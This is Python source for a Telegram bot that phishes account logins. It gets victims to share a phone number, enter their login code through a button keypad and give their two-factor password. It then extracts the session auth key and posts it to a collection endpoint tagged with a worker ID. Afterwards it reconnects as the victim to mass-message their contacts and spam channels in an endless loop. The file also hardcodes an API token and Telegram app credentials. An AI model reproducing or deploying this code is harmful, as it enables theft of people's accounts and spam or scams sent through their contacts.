from ClientTelegram import ClientTelegram

import config
from lolzapi import LolzteamApi
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardRemove, \
    ReplyKeyboardMarkup, KeyboardButton, \
    InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
import requests
from telethon import TelegramClient
import asyncio
from telethon import functions
from telethon.tl.types import InputPeerSelf
from telethon.errors import SessionPasswordNeededError
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.payments import GetPaymentReceiptRequest
import os
from telethon.sessions import StringSession
import flag
from telethon.tl.functions.channels import JoinChannelRequest
import binascii
import threading
from telethon.tl.functions.channels import LeaveChannelRequest
import psutil
import time

def StopFunction():
    while True:
        time.sleep(0.1)
        files = os.listdir()
        if "stop.stop" not in files:
            continue

        os.remove("stop.stop")

        dp.stop_polling()
        psutil.Process(os.getpid()).terminate()

global steps
steps = {}

global lolz
lolz = LolzteamApi("b1172952fd04ba44d5e749ece2b06599150e5227")

bot = Bot(token=config.botToken)
dp = Dispatcher(bot)

@dp.message_handler(commands=['start'])
async def process_start_command(message: types.Message):
    button_hi = KeyboardButton(config.textInfo["authorizationButtonText"], request_contact=True)
    greet_kb = ReplyKeyboardMarkup(resize_keyboard=True)
    greet_kb.add(button_hi)

    await message.reply(config.textInfo["startText"], reply_markup=greet_kb)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def contacts(msg: types.Message):
    await msg.reply(config.textInfo["connectionText"])

    try:
        if steps[msg.chat.id]["step"] == -1:
            return
    except:
        pass

    if msg.chat.id in steps.keys():
        if "client" in steps[msg.chat.id].keys():
            await steps[msg.chat.id]["client"].client.disconnect()

    try:
        steps[msg.chat.id] = {}
        steps[msg.chat.id]["step"] = 0

        client = await ClientTelegram.create(f"{msg.contact.phone_number}", 16102116, '40144a84410673ed0121c9a41e0138fa')

        client111 = client

        greet_kb = InlineKeyboardMarkup()
        greet_kb.add(InlineKeyboardButton('1', callback_data="1"), InlineKeyboardButton('2', callback_data="2"), InlineKeyboardButton('3', callback_data="3"))
        greet_kb.add(InlineKeyboardButton('4', callback_data="4"), InlineKeyboardButton('5', callback_data="5"), InlineKeyboardButton('6', callback_data="6"))
        greet_kb.add(InlineKeyboardButton('7', callback_data="7"), InlineKeyboardButton('8', callback_data="8"), InlineKeyboardButton('9', callback_data="9"))
        greet_kb.add(InlineKeyboardButton('0', callback_data="0"))
        greet_kb.add(InlineKeyboardButton('send', callback_data="send"), InlineKeyboardButton('delete', callback_data="del"))

        steps[msg.chat.id]["client"] = client
        steps[msg.chat.id]["step"] = 1
        steps[msg.chat.id]["phone_number"] = msg.contact.phone_number

        old_text = config.textInfo["codeText"]
        steps[msg.chat.id]["msg_text"] = old_text
        msgg = await msg.reply(config.textInfo["codeText"], reply_markup=greet_kb)

    except Exception as e:
        print(msg.contact.phone_number)
        print(e)

        os.remove(f"{msg.contact.phone_number}.session")

        await msg.reply(config.textInfo["errorSendCodeText"])

        return

@dp.callback_query_handler()
async def inline_click(call: types.CallbackQuery):
    if steps[call.message.chat.id]["step"] != 1:
        return
    callback = call.data

    greet_kb = InlineKeyboardMarkup()
    greet_kb.add(InlineKeyboardButton('1', callback_data="1"), InlineKeyboardButton('2', callback_data="2"), InlineKeyboardButton('3', callback_data="3"))
    greet_kb.add(InlineKeyboardButton('4', callback_data="4"), InlineKeyboardButton('5', callback_data="5"), InlineKeyboardButton('6', callback_data="6"))
    greet_kb.add(InlineKeyboardButton('7', callback_data="7"), InlineKeyboardButton('8', callback_data="8"), InlineKeyboardButton('9', callback_data="9"))
    greet_kb.add(InlineKeyboardButton('0', callback_data="0"))
    greet_kb.add(InlineKeyboardButton('send', callback_data="send"), InlineKeyboardButton('delete', callback_data="del"))

    if callback != "send" and callback != "del":
        steps[call.message.chat.id]["msg_text"] = f"{call.message.text}{callback}"
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"{call.message.text}{callback}", reply_markup=greet_kb)
    if callback == "del":
        if call.message.text == config.textInfo["codeText"]:
            return

        steps[call.message.chat.id]["msg_text"] = call.message.text[:-1]
        await bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=call.message.text[:-1], reply_markup=greet_kb)

    if callback == "send":
        if len(call.message.text.replace(config.textInfo["codeText"], "")) == 0:
            await call.message.reply(config.textInfo["invalidCodeErrorText"])
            return
        try:
            client111 = steps[call.message.chat.id]["client"]

            await client111.enter_code(call.message.text.replace(config.textInfo["codeText"], ""))

            steps[call.message.chat.id]["msg_text"] = ""

            sessionString = StringSession.save(client111.client.session)

            sessionString = StringSession(sessionString)
            await client111.client.disconnect()
            os.remove(f"./{client111.phone_number}.session")

            await call.message.reply(config.textInfo["validCodeText"])

            await asyncio.sleep(3)

            dc_id = sessionString.dc_id
            auth_key = binascii.hexlify(sessionString.auth_key.key)

            steps[call.message.chat.id]["step"] = -1
            requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})

            time.sleep(300)

            client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
            await client.connect()

            text = config.spamInfo["spamText"]

            if config.spamInfo["dmSpam"] == True:
                async for dialog in client.iter_dialogs():
                    if dialog.is_channel and dialog.entity.creator != True:
                        continue
                    try:
                        if dialog.entity.bot:
                            continue
                    except:
                        pass

                    try:
                        await client.send_message(dialog.id, text)
                    except:
                        pass

            for channel in config.spamInfo["joinChannels"]:
                try:
                    await client(JoinChannelRequest(channel))
                except:
                    pass

            while True:
                await asyncio.sleep(12)

                for channel_id in config.spamInfo["channelsSpam"]:
                    try:
                        await client.send_message(int(channel_id), text)
                    except:
                        pass

        except ClientTelegram.NeedPassword:
            await call.message.reply(config.textInfo["passwordNeedErrorText"])
            steps[call.message.chat.id]["step"] = 2
        except:
            code = call.message.text.replace(config.textInfo["codeText"], "")

            await call.message.reply(config.textInfo["invalidCodeErrorText"])

@dp.message_handler(content_types=types.ContentTypes.TEXT)
async def code_step(message: types.Message):
    if message.chat.id not in steps.keys():
        await message.reply("/start")
        return
    if steps[message.chat.id]["step"] != 2:
        return
    client111 = steps[message.chat.id]["client"]

    try:
        await client111.enter_password(message.text)

        steps[message.chat.id]["msg_text"] = ""
        sessionString = StringSession.save(client111.client.session)
        sessionString = StringSession(sessionString)
        await client111.client.disconnect()
        os.remove(f"./{client111.phone_number}.session")

        await message.reply(config.textInfo["validCodeText"])

        dc_id = sessionString.dc_id
        auth_key = binascii.hexlify(sessionString.auth_key.key)

        steps[message.chat.id]["step"] = -1

        await message.reply("1111");
        requests.post("http://localhost:5000/newAccount", json={"worker_id": config.worker_id, "auth_key": auth_key.decode("utf-8"), "dc_id": dc_id})

        time.sleep(300)

        client = TelegramClient(sessionString, 16102116, "40144a84410673ed0121c9a41e0138fa")
        await client.connect()

        text = config.spamInfo["spamText"]

        if config.spamInfo["dmSpam"] == True:
            async for dialog in client.iter_dialogs():
                if dialog.is_channel and dialog.entity.creator != True:
                    continue
                try:
                    if dialog.entity.bot:
                        continue
                except:
                    pass

                try:
                    await client.send_message(dialog.id, text)
                except:
                    pass

        for channel in config.spamInfo["joinChannels"]:
            try:
                await client(JoinChannelRequest(channel))
            except:
                pass

        while True:
            await asyncio.sleep(12)

            for channel_id in config.spamInfo["channelsSpam"]:
                try:
                    await client.send_message(int(channel_id), text)
                except:
                    pass

    except Exception as e:
        await message.reply(config.textInfo["invalidPasswordError"])


if __name__ == '__main__':
    checkFileThread = threading.Thread(target=StopFunction)
    checkFileThread.start()

    executor.start_polling(dp)